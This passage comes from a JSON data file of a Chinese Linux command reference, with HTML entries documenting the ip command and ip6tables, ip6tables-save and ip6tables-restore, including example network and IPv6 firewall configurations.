        "body": "<h1 id=\"ip\">ip</h1>\n<p>网络配置工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ip命令</strong> 用来显示或操纵Linux主机的路由、网络设备、策略路由和隧道，是Linux下较新的功能强大的网络配置工具。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">ip</span>(选项)(参数)</span>\n<span class=\"hljs-variable\">Usage</span>: <span class=\"hljs-variable\">ip</span> [ <span class=\"hljs-variable\">OPTIONS</span> ] <span class=\"hljs-variable\"><span class=\"hljs-class\">OBJECT</span></span> { <span class=\"hljs-variable\">COMMAND</span> | <span class=\"hljs-variable\">help</span> }\n       <span class=\"hljs-variable\">ip</span> [ -<span class=\"hljs-variable\">force</span> ] -<span class=\"hljs-variable\">batch</span> <span class=\"hljs-variable\">filename</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">OBJECT := { link | <span class=\"hljs-type\">address</span> | <span class=\"hljs-type\">addrlabel</span> | <span class=\"hljs-type\">route</span> | <span class=\"hljs-type\">rule</span> | <span class=\"hljs-type\">neigh</span> | <span class=\"hljs-type\">ntable</span> |\n       <span class=\"hljs-type\">tunnel</span> | <span class=\"hljs-type\">tuntap</span> | <span class=\"hljs-type\">maddress</span> | <span class=\"hljs-type\">mroute</span> | <span class=\"hljs-type\">mrule</span> | <span class=\"hljs-type\">monitor</span> | <span class=\"hljs-type\">xfrm</span> |\n       <span class=\"hljs-type\">netns</span> | <span class=\"hljs-type\">l2tp</span> | <span class=\"hljs-type\">macsec</span> | <span class=\"hljs-type\">tcp_metrics</span> | <span class=\"hljs-type\">token</span> }\n       \n-V：显示指令版本信息；\n-s：输出更详细的信息；\n-f：强制使用指定的协议族；\n<span class=\"hljs-number\">-4</span>：指定使用的网络层协议是IPv4协议；\n<span class=\"hljs-number\">-6</span>：指定使用的网络层协议是IPv6协议；\n<span class=\"hljs-number\">-0</span>：输出信息每条记录输出一行，即使内容较多也不换行显示；\n-r：显示主机时，不使用IP地址，而使用主机的域名。\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<pre><code class=\"language-shell\">OPTIONS := { -V[ersion] | <span class=\"hljs-type\">-s</span>[tatistics] | <span class=\"hljs-type\">-d</span>[etails] | <span class=\"hljs-type\">-r</span>[esolve] |\n        <span class=\"hljs-type\">-h</span>[uman-readable] | <span class=\"hljs-type\">-iec</span> |\n        <span class=\"hljs-type\">-f</span>[amily] { inet | <span class=\"hljs-type\">inet6</span> | <span class=\"hljs-type\">ipx</span> | <span class=\"hljs-type\">dnet</span> | <span class=\"hljs-type\">bridge</span> | <span class=\"hljs-type\">link</span> } |\n        <span class=\"hljs-type\">-4</span> | <span class=\"hljs-type\">-6</span> | <span class=\"hljs-type\">-I</span> | <span class=\"hljs-type\">-D</span> | <span class=\"hljs-type\">-B</span> | <span class=\"hljs-type\">-0</span> |\n        <span class=\"hljs-type\">-l</span>[oops] { maximum-addr-flush-attempts } |\n        <span class=\"hljs-type\">-o</span>[neline] | <span class=\"hljs-type\">-t</span>[imestamp] | <span class=\"hljs-type\">-ts</span>[hort] | <span class=\"hljs-type\">-b</span>[atch] [filename] |\n        <span class=\"hljs-type\">-rc</span>[vbuf] [size] | <span class=\"hljs-type\">-n</span>[etns] name | <span class=\"hljs-type\">-a</span>[ll] }\n        \n网络对象：指定要管理的网络对象；\n具体操作：对指定的网络对象完成具体操作；\nhelp：显示网络对象支持的操作命令的帮助信息。\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shellbash\">ip link show                     # 显示网络接口信息<span class=\"hljs-built_in\">\nip </span>link <span class=\"hljs-built_in\">set</span> eth0 up             # 开启网卡<span class=\"hljs-built_in\">\nip </span>link <span class=\"hljs-built_in\">set</span> eth0 down            # 关闭网卡<span class=\"hljs-built_in\">\nip </span>link <span class=\"hljs-built_in\">set</span> eth0 promisc on      # 开启网卡的混合模式<span class=\"hljs-built_in\">\nip </span>link <span class=\"hljs-built_in\">set</span> eth0 promisc offi    # 关闭网卡的混个模式<span class=\"hljs-built_in\">\nip </span>link <span class=\"hljs-built_in\">set</span> eth0 txqueuelen 1200 # 设置网卡队列长度<span class=\"hljs-built_in\">\nip </span>link <span class=\"hljs-built_in\">set</span> eth0 mtu 1400        # 设置网卡最大传输单元<span class=\"hljs-built_in\">\nip </span>addr show     # 显示网卡IP信息<span class=\"hljs-built_in\">\nip </span>addr <span class=\"hljs-built_in\">add</span> 192.168.0.1/24 dev eth0 # 设置eth0网卡IP地址192.168.0.1<span class=\"hljs-built_in\">\nip </span>addr del 192.168.0.1/24 dev eth0 # 删除eth0网卡IP地址\n<span class=\"hljs-built_in\">\nip route </span>show # 显示系统路由<span class=\"hljs-built_in\">\nip route </span><span class=\"hljs-built_in\">add</span><span class=\"hljs-built_in\"> default </span>via 192.168.1.254   # 设置系统默认路由<span class=\"hljs-built_in\">\nip route </span>list                 # 查看路由信息<span class=\"hljs-built_in\">\nip route </span><span class=\"hljs-built_in\">add</span> 192.168.4.0/24  via  192.168.0.254 dev eth0 # 设置192.168.4.0网段的网关为192.168.0.254,数据走eth0接口<span class=\"hljs-built_in\">\nip route </span><span class=\"hljs-built_in\">add</span><span class=\"hljs-built_in\"> default </span>via  192.168.0.254  dev eth0        # 设置默认网关为192.168.0.254<span class=\"hljs-built_in\">\nip route </span>del 192.168.4.0/24   # 删除192.168.4.0网段的网关<span class=\"hljs-built_in\">\nip route </span>del<span class=\"hljs-built_in\"> default </span>         # 删除默认路由<span class=\"hljs-built_in\">\nip route </span>delete 192.168.1.0/24 dev eth0 # 删除路由\n</code></pre>\n<p><strong>用ip命令显示网络设备的运行状态</strong> </p>\n<pre><code class=\"language-shell\">[<span class=\"hljs-string\">root@localhost</span> <span class=\"hljs-string\">~</span>]<span class=\"hljs-comment\"># ip link list</span>\n<span class=\"hljs-attr\">1: lo:</span> <span class=\"hljs-string\">&lt;LOOPBACK,UP,LOWER_UP&gt;</span> <span class=\"hljs-string\">mtu</span> <span class=\"hljs-number\">16436</span> <span class=\"hljs-string\">qdisc</span> <span class=\"hljs-string\">noqueue</span>\n    <span class=\"hljs-string\">link/loopback</span> <span class=\"hljs-number\">00</span><span class=\"hljs-string\">:00:00:00:00:00</span> <span class=\"hljs-string\">brd</span> <span class=\"hljs-number\">00</span><span class=\"hljs-string\">:00:00:00:00:00</span>\n<span class=\"hljs-attr\">2: eth0:</span> <span class=\"hljs-string\">&lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt;</span> <span class=\"hljs-string\">mtu</span> <span class=\"hljs-number\">1500 </span><span class=\"hljs-string\">qdisc</span> <span class=\"hljs-string\">pfifo_fast</span> <span class=\"hljs-string\">qlen</span> <span class=\"hljs-number\">1000</span>\n    <span class=\"hljs-string\">link/ether</span> <span class=\"hljs-number\">00</span><span class=\"hljs-string\">:16:3e:00:1e:51</span> <span class=\"hljs-string\">brd</span> <span class=\"hljs-string\">ff:ff:ff:ff:ff:ff</span>\n<span class=\"hljs-attr\">3: eth1:</span> <span class=\"hljs-string\">&lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt;</span> <span class=\"hljs-string\">mtu</span> <span class=\"hljs-number\">1500 </span><span class=\"hljs-string\">qdisc</span> <span class=\"hljs-string\">pfifo_fast</span> <span class=\"hljs-string\">qlen</span> <span class=\"hljs-number\">1000</span>\n    <span class=\"hljs-string\">link/ether</span> <span class=\"hljs-number\">00</span><span class=\"hljs-string\">:16:3e:00:1e:52</span> <span class=\"hljs-string\">brd</span> <span class=\"hljs-string\">ff:ff:ff:ff:ff:ff</span>\n</code></pre>\n<p><strong>显示更加详细的设备信息</strong> </p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># ip -s link list</span>\n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu<span class=\"hljs-number\"> 16436 </span>qdisc noqueue\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    RX: bytes  packets  errors  dropped overrun mcast   \n   <span class=\"hljs-number\"> 5082831 </span>  <span class=\"hljs-number\"> 56145 </span>  <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>     \n    TX: bytes  packets  errors  dropped carrier collsns\n   <span class=\"hljs-number\"> 5082831 </span>  <span class=\"hljs-number\"> 56145 </span>  <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>     \n2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu<span class=\"hljs-number\"> 1500 </span>qdisc pfifo_fast qlen 1000\n    link/ether 00:16:3e:00:1e:51 brd ff:ff:ff:ff:ff:ff\n    RX: bytes  packets  errors  dropped overrun mcast   \n   <span class=\"hljs-number\"> 3641655380 </span>62027099<span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>     \n    TX: bytes  packets  errors  dropped carrier collsns\n   <span class=\"hljs-number\"> 6155236 </span>  <span class=\"hljs-number\"> 89160 </span>  <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>     \n3: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu<span class=\"hljs-number\"> 1500 </span>qdisc pfifo_fast qlen 1000\n    link/ether 00:16:3e:00:1e:52 brd ff:ff:ff:ff:ff:ff\n    RX: bytes  packets  errors  dropped overrun mcast   \n   <span class=\"hljs-number\"> 2562136822 </span>488237847<span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>     \n    TX: bytes  packets  errors  dropped carrier collsns\n   <span class=\"hljs-number\"> 3486617396 </span>9691081 <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>    \n</code></pre>\n<p><strong>显示核心路由表</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-string\">[root@localhost ~]</span># ip route list \n<span class=\"hljs-number\">112.124.12.0</span>/<span class=\"hljs-number\">22</span> dev eth1  proto kernel  scope link  src <span class=\"hljs-number\">112</span>.<span class=\"hljs-number\">124</span>.<span class=\"hljs-number\">15</span>.<span class=\"hljs-number\">130</span>\n<span class=\"hljs-number\">10.160.0.0</span>/<span class=\"hljs-number\">20</span> dev eth0  proto kernel  scope link  src <span class=\"hljs-number\">10</span>.<span class=\"hljs-number\">160</span>.<span class=\"hljs-number\">7</span>.<span class=\"hljs-number\">81</span>\n<span class=\"hljs-number\">192.168.0.0</span>/<span class=\"hljs-number\">16</span> via <span class=\"hljs-number\">10</span>.<span class=\"hljs-number\">160</span>.<span class=\"hljs-number\">15</span>.<span class=\"hljs-number\">247</span> dev eth0\n<span class=\"hljs-number\">172.16.0.0</span>/<span class=\"hljs-number\">12</span> via <span class=\"hljs-number\">10</span>.<span class=\"hljs-number\">160</span>.<span class=\"hljs-number\">15</span>.<span class=\"hljs-number\">247</span> dev eth0\n<span class=\"hljs-number\">10.0.0.0</span>/<span class=\"hljs-number\">8</span> via <span class=\"hljs-number\">10</span>.<span class=\"hljs-number\">160</span>.<span class=\"hljs-number\">15</span>.<span class=\"hljs-number\">247</span> dev eth0\ndefault via <span class=\"hljs-number\">112</span>.<span class=\"hljs-number\">124</span>.<span class=\"hljs-number\">15</span>.<span class=\"hljs-number\">247</span> dev eth1\n</code></pre>\n<p><strong>显示邻居表</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-string\">[root@localhost ~]</span># ip neigh list\n<span class=\"hljs-number\">112.124.15.247</span> dev eth1 lladdr <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:0c:9f:f3:<span class=\"hljs-number\">88</span> REACHABLE\n<span class=\"hljs-number\">10.160.15.247</span> dev eth0 lladdr <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:0c:9f:f2:c0 STALE\n</code></pre>\n<p><strong>获取主机所有网络接口</strong></p>\n<pre><code class=\"language-shell\">ip <span class=\"hljs-keyword\">link</span> | <span class=\"hljs-keyword\">grep</span> -E <span class=\"hljs-string\">'^[0-9]'</span> | awk -F: <span class=\"hljs-string\">'{print $2}'</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "ip6tables-restore",
        "des": "还原ip6tables表",
        "body": "<h1 id=\"ip6tables-restore\">ip6tables-restore</h1>\n<p>还原ip6tables表</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ip6tables-restore命令</strong> 用来还原ip6tables表。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">ip6tables-restore</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-c：指定在还原iptables表时，还原当前的数据包计数器和字节计数器值；</span>\n<span class=\"hljs-deletion\">-t：指定要还原的表的名称。</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "ip6tables-save",
        "des": "保存ip6tables表配置",
        "body": "<h1 id=\"ip6tables-save\">ip6tables-save</h1>\n<p>保存ip6tables表配置</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ip6tables-save命令</strong> 将Linux内核中ip6tables表导出到标准输出设备上。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">ip6tables-save</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-c：指定在保存iptables表时，保存当前的数据包计数器和字节计数器值；</span>\n<span class=\"hljs-deletion\">-t：指定要保存的表的名称。</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "ip6tables",
        "des": "linux中防火墙软件",
        "body": "<h1 id=\"ip6tables\">ip6tables</h1>\n<p>linux中防火墙软件</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ip6tables命令</strong> 和iptables一样，都是linux中防火墙软件，不同的是ip6tables采用的TCP/ip协议为IPv6。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">ip6tables</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-t&lt;表&gt;：指定要操纵的表；</span>\n<span class=\"hljs-deletion\">-A：向规则链中添加条目；</span>\n<span class=\"hljs-deletion\">-D：从规则链中删除条目；</span>\n<span class=\"hljs-deletion\">-i：向规则链中插入条目；</span>\n<span class=\"hljs-deletion\">-R：替换规则链中的条目；</span>\n<span class=\"hljs-deletion\">-L：显示规则链中已有的条目；</span>\n<span class=\"hljs-deletion\">-F：清楚规则链中已有的条目；</span>\n<span class=\"hljs-deletion\">-Z：清空规则链中的数据包计算器和字节计数器；</span>\n<span class=\"hljs-deletion\">-N：创建新的用户自定义规则链；</span>\n<span class=\"hljs-deletion\">-P：定义规则链中的默认目标；</span>\n<span class=\"hljs-deletion\">-h：显示帮助信息；</span>\n<span class=\"hljs-deletion\">-p：指定要匹配的数据包协议类型；</span>\n<span class=\"hljs-deletion\">-s：指定要匹配的数据包源ip地址；</span>\n<span class=\"hljs-deletion\">-j&lt;目标&gt;：指定要跳转的目标；</span>\n<span class=\"hljs-deletion\">-i&lt;网络接口&gt;：指定数据包进入本机的网络接口；</span>\n<span class=\"hljs-deletion\">-o&lt;网络接口&gt;：指定数据包要离开本机所使用的网络接口。</span>\n<span class=\"hljs-deletion\">-c&lt;计数器&gt;：在执行插入操作（insert），追加操作（append），替换操作（replace）时初始化包计数器和字节计数器。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>在命令行窗口输入下面的指令就可以查看当前的 IPv6 防火墙配置：</p>\n<pre><code class=\"language-shell\">ip6tables -<span class=\"hljs-keyword\">nl</span> --<span class=\"hljs-keyword\">line</span>-numbers\n</code></pre>\n<p> <strong>/etc/sysconfig/ip6tables文件</strong> </p>\n<p>使用编辑器编辑<code>/etc/sysconfig/ip6tables</code>文件：</p>\n<pre><code class=\"language-shell\">vi <span class=\"hljs-regexp\">/etc/</span>sysconfig/ip6tables\n</code></pre>\n<p>可能会看到下面的默认 ip6tables 规则：</p>\n<pre><code class=\"language-shell\">*filter\n<span class=\"hljs-meta\">:INPUT accept [0:0]</span>\n<span class=\"hljs-meta\">:FORWARD ACCEPT [0:0]</span>\n<span class=\"hljs-meta\">:OUTPUT ACCEPT [0:0]</span>\n<span class=\"hljs-meta\">:RH-Firewall-1-INPUT - [0:0]</span>\n-A INPUT -j RH-Firewall-1-INPUT\n-A FORWARD -j RH-Firewall-1-INPUT\n-A RH-Firewall-1-INPUT -i lo -j ACCEPT\n-A RH-Firewall-1-INPUT -p icmpv6 -j ACCEPT\n-A RH-Firewall-1-INPUT -p 50 -j ACCEPT\n-A RH-Firewall-1-INPUT -p 51 -j ACCEPT\n-A RH-Firewall-1-INPUT -p udp --dport 5353 -d ff02::fb -j ACCEPT\n-A RH-Firewall-1-INPUT -p udp -m udp --dport 631 -j ACCEPT\n-A RH-Firewall-1-INPUT -p tcp -m tcp --dport 631 -j ACCEPT\n-A RH-Firewall-1-INPUT -p udp -m udp --dport 32768:61000 -j ACCEPT\n-A RH-Firewall-1-INPUT -p tcp -m tcp --dport 32768:61000 ! --syn -j ACCEPT\n-A RH-Firewall-1-INPUT -m tcp -p tcp --dport 22 -j ACCEPT\n-A RH-Firewall-1-INPUT -j reject --reject-with icmp6-adm-prohibited\nCOMMIT\n</code></pre>\n<p>与 IPv4 的 iptables 规则类似，但又不完全相同。</p>\n<p>要开启 80 端口（HTTP 服务器端口），在 COMMIT 一行之前添加如下规则：</p>\n<pre><code class=\"language-shell\">-<span class=\"hljs-selector-tag\">A</span> RH-Firewall-<span class=\"hljs-number\">1</span>-<span class=\"hljs-selector-tag\">INPUT</span> -m tcp -<span class=\"hljs-selector-tag\">p</span> tcp --dport <span class=\"hljs-number\">80</span> -j ACCEPT\n</code></pre>\n<p><code>-p tcp</code>表示仅针对 tcp 协议的通信。<code>--dport</code>指定端口号。</p>\n<p>要开启 53 端口（DNS 服务器端口），在 COMMIT 一行之前添加如下规则：</p>\n<pre><code class=\"language-shell\">-<span class=\"hljs-selector-tag\">A</span> RH-Firewall-<span class=\"hljs-number\">1</span>-<span class=\"hljs-selector-tag\">INPUT</span> -m tcp -<span class=\"hljs-selector-tag\">p</span> tcp --dport <span class=\"hljs-number\">53</span> -j ACCEPT\n-<span class=\"hljs-selector-tag\">A</span> RH-Firewall-<span class=\"hljs-number\">1</span>-<span class=\"hljs-selector-tag\">INPUT</span> -m udp -<span class=\"hljs-selector-tag\">p</span> tcp --dport <span class=\"hljs-number\">53</span> -j ACCEPT\n</code></pre>\n<p>同时针对 tcp 和 udp 协议开启 53 端口。</p>\n<p>要开启 443 端口，在 COMMIT 一行之前添加如下规则：</p>\n<pre><code class=\"language-shell\">-<span class=\"hljs-selector-tag\">A</span> RH-Firewall-<span class=\"hljs-number\">1</span>-<span class=\"hljs-selector-tag\">INPUT</span> -m tcp -<span class=\"hljs-selector-tag\">p</span> tcp --dport <span class=\"hljs-number\">443</span> -j ACCEPT\n</code></pre>\n<p>要开启 25 端口（SMTP 邮件服务器端口），在 COMMIT 一行之前添加如下规则：</p>\n<pre><code class=\"language-shell\">-<span class=\"hljs-selector-tag\">A</span> RH-Firewall-<span class=\"hljs-number\">1</span>-<span class=\"hljs-selector-tag\">INPUT</span> -m tcp -<span class=\"hljs-selector-tag\">p</span> tcp --dport <span class=\"hljs-number\">25</span> -j ACCEPT\n</code></pre>\n<p>对于那些没有特定规则与之匹配的数据包，可能是我们不想要的，多半是有问题的。我们可能也希望在丢弃（DROP）之前记录它们。此时，可以将最后一行：</p>\n<pre><code class=\"language-shell\">-A RH-Firewall<span class=\"hljs-number\">-1</span>-<span class=\"hljs-keyword\">INPUT</span> -j REJECT <span class=\"hljs-comment\">--reject-with icmp6-adm-prohibited</span>\n<span class=\"hljs-keyword\">COMMIT</span>\n</code></pre>\n<p>改为：</p>\n<pre><code class=\"language-shell\">-A RH-Firewall<span class=\"hljs-number\">-1</span>-<span class=\"hljs-keyword\">INPUT</span> -j <span class=\"hljs-keyword\">LOG</span>\n-A RH-Firewall<span class=\"hljs-number\">-1</span>-<span class=\"hljs-keyword\">INPUT</span> -j <span class=\"hljs-keyword\">DROP</span>\n<span class=\"hljs-keyword\">COMMIT</span>\n</code></pre>\n<p>保存并关闭该文件。然后重新启动 ip6tables 防火墙：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\"># service ip6tables restart</span>\n</code></pre>\n<p>然后重新查看 ip6tables 规则，可以看到如下所示的输出：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\"># ip6tables -vnL --<span class=\"hljs-keyword\">line</span>-numbers</span>\n</code></pre>\n<p>输出示例：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">Chain</span> INPUT (policy ACCEPT <span class=\"hljs-number\">0</span> packets, <span class=\"hljs-number\">0</span> bytes)\n<span class=\"hljs-attribute\">num</span>   pkts bytes target     prot opt in     out     source               destination\n<span class=\"hljs-attribute\">1</span>    <span class=\"hljs-number\">42237</span> <span class=\"hljs-number\">3243</span>K RH-Firewall-<span class=\"hljs-number\">1</span>-INPUT  <span class=\"hljs-literal\">all</span>      *      *       ::/<span class=\"hljs-number\">0</span>                 ::/<span class=\"hljs-number\">0</span>\n<span class=\"hljs-attribute\">Chain</span> FORWARD (policy ACCEPT <span class=\"hljs-number\">0</span> packets, <span class=\"hljs-number\">0</span> bytes)\n<span class=\"hljs-attribute\">num</span>   pkts bytes target     prot opt in     out     source               destination\n<span class=\"hljs-attribute\">1</span>        <span class=\"hljs-number\">0</span>     <span class=\"hljs-number\">0</span> RH-Firewall-<span class=\"hljs-number\">1</span>-INPUT  <span class=\"hljs-literal\">all</span>      *      *       ::/<span class=\"hljs-number\">0</span>                 ::/<span class=\"hljs-number\">0</span>\n<span class=\"hljs-attribute\">Chain</span> OUTPUT (policy ACCEPT <span class=\"hljs-number\">12557</span> packets, <span class=\"hljs-number\">2042</span>K bytes)\n<span class=\"hljs-attribute\">num</span>   pkts bytes target     prot opt in     out     source               destination\n<span class=\"hljs-attribute\">Chain</span> RH-Firewall-<span class=\"hljs-number\">1</span>-INPUT (<span class=\"hljs-number\">2</span> references)\n<span class=\"hljs-attribute\">num</span>   pkts bytes target     prot opt in     out     source               destination\n<span class=\"hljs-attribute\">1</span>        <span class=\"hljs-number\">6</span>   <span class=\"hljs-number\">656</span> ACCEPT     <span class=\"hljs-literal\">all</span>      lo     *       ::/<span class=\"hljs-number\">0</span>                 ::/<span class=\"hljs-number\">0</span>\n<span class=\"hljs-attribute\">2</span>    <span class=\"hljs-number\">37519</span> <span class=\"hljs-number\">2730</span>K ACCEPT     icmpv6    *      *       ::/<span class=\"hljs-number\">0</span>                 ::/<span class=\"hljs-number\">0</span>\n<span class=\"hljs-attribute\">3</span>        <span class=\"hljs-number\">0</span>     <span class=\"hljs-number\">0</span> ACCEPT     esp      *      *       ::/<span class=\"hljs-number\">0</span>                 ::/<span class=\"hljs-number\">0</span>\n<span class=\"hljs-attribute\">4</span>        <span class=\"hljs-number\">0</span>     <span class=\"hljs-number\">0</span> ACCEPT     ah       *      *       ::/<span class=\"hljs-number\">0</span>                 ::/<span class=\"hljs-number\">0</span>\n<span class=\"hljs-attribute\">5</span>      <span class=\"hljs-number\">413</span> <span class=\"hljs-number\">48385</span> ACCEPT     udp      *      *       ::/<span class=\"hljs-number\">0</span>                 ff02::fb/<span class=\"hljs-number\">128</span>       udp dpt:<span class=\"hljs-number\">5353</span>\n<span class=\"hljs-attribute\">6</span>        <span class=\"hljs-number\">0</span>     <span class=\"hljs-number\">0</span> ACCEPT     udp      *      *       ::/<span class=\"hljs-number\">0</span>                 ::/<span class=\"hljs-number\">0</span>               udp dpt:<span class=\"hljs-number\">631</span>\n<span class=\"hljs-attribute\">7</span>        <span class=\"hljs-number\">0</span>     <span class=\"hljs-number\">0</span> ACCEPT     tcp      *      *       ::/<span class=\"hljs-number\">0</span>                 ::/<span class=\"hljs-number\">0</span>               tcp dpt:<span class=\"hljs-number\">631</span>\n<span class=\"hljs-attribute\">8</span>      <span class=\"hljs-number\">173</span> <span class=\"hljs-number\">79521</span> ACCEPT     udp      *      *       ::/<span class=\"hljs-number\">0</span>                 ::/<span class=\"hljs-number\">0</span>               udp dpts:<span class=\"hljs-number\">32768</span>:<span class=\"hljs-number\">61000</span>\n<span class=\"hljs-attribute\">9</span>        <span class=\"hljs-number\">0</span>     <span class=\"hljs-number\">0</span> ACCEPT     tcp      *      *       ::/<span class=\"hljs-number\">0</span>                 ::/<span class=\"hljs-number\">0</span>               tcp dpts:<span class=\"hljs-number\">32768</span>:<span class=\"hljs-number\">61000</span> flags:!<span class=\"hljs-number\">0</span>x16/<span class=\"hljs-number\">0</span>x02\n<span class=\"hljs-attribute\">10</span>       <span class=\"hljs-number\">0</span>     <span class=\"hljs-number\">0</span> ACCEPT     tcp      *      *       ::/<span class=\"hljs-number\">0</span>                 ::/<span class=\"hljs-number\">0</span>               tcp dpt:<span class=\"hljs-number\">22</span>\n<span class=\"hljs-attribute\">11</span>       <span class=\"hljs-number\">0</span>     <span class=\"hljs-number\">0</span> ACCEPT     tcp      *      *       ::/<span class=\"hljs-number\">0</span>                 ::/<span class=\"hljs-number\">0</span>               tcp dpt:<span class=\"hljs-number\">80</span>\n<span class=\"hljs-attribute\">12</span>       <span class=\"hljs-number\">0</span>     <span class=\"hljs-number\">0</span> ACCEPT     tcp      *      *       ::/<span class=\"hljs-number\">0</span>                 ::/<span class=\"hljs-number\">0</span>               tcp dpt:<span class=\"hljs-number\">53</span>\n<span class=\"hljs-attribute\">13</span>    <span class=\"hljs-number\">4108</span>  <span class=\"hljs-number\">380</span>K ACCEPT     udp      *      *       ::/<span class=\"hljs-number\">0</span>                 ::/<span class=\"hljs-number\">0</span>               udp dpt:<span class=\"hljs-number\">53</span>\n<span class=\"hljs-attribute\">14</span>      <span class=\"hljs-number\">18</span>  <span class=\"hljs-number\">4196</span> REJECT     <span class=\"hljs-literal\">all</span>      *      *       ::/<span class=\"hljs-number\">0</span>                 ::/<span class=\"hljs-number\">0</span>\n</code></pre>\n<p> <strong>IPv6 私有 IP</strong> </p>\n<p>IPv4 通常默认即可保护内部局域网私有 IP 上的主机。但是 IPv6 的地址非常丰富，不再需要使用类似 NAT 等协议的私有网络。这样一来，所有的内部主机都可以拥有公网 IP 而直接连接到互联网，也就同时暴露于互联网上的各种威胁之中了。那么，如何配置 IPv6 防火墙使其默认将除了 ping6 请求之外的所有输入数据包都丢弃呢？可以使用FC00::/7&nbsp;前缀来标识本地 IPv6 单播地址。</p>\n<p> <strong>允许特定的 ICMPv6 通信</strong> </p>\n<p>使用 IPv6 的时候需要允许比 IPv4 更多类型的 ICMP 通信以保证路由和 IP 地址自动配置等功能正常工作。有时候，如果你的规则设置太过苛刻，可能都无法分配到正确的 IPv6 地址。当然，不使用 DHCP 而是手动配置 IP 地址的除外。</p>\n<p>下面是一些比较常见的 ipv6-icmp 配置实例：</p>\n<pre><code class=\"language-shell\">:ICMPv6 - [0:0]\n<span class=\"hljs-comment\"># Approve certain ICMPv6 types and all outgoing ICMPv6</span>\n<span class=\"hljs-comment\"># http://forum.linode.com/viewtopic.php?p=39840#39840</span>\n-A INPUT -p icmpv6 -j ICMPv6\n-A ICMPv6 -p icmpv6 --icmpv6-type echo-request -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type destination-unreachable -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type packet-too-big -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type time-exceeded -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type parameter-problem -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type router-solicitation -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type router-advertisement -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type neighbour-solicitation -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type neighbour-advertisement -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type redirect -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type 141 -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type 142 -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type 148 -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type 149 -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type 130 -s fe80::/10 -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type 131 -s fe80::/10 -j ACCEPT\n-A ICMPv6 -p icmpv6 --icmpv6-type 132 -s fe80::/10 -j ACCEPT\n-A ICMPv6 -p icmpv6 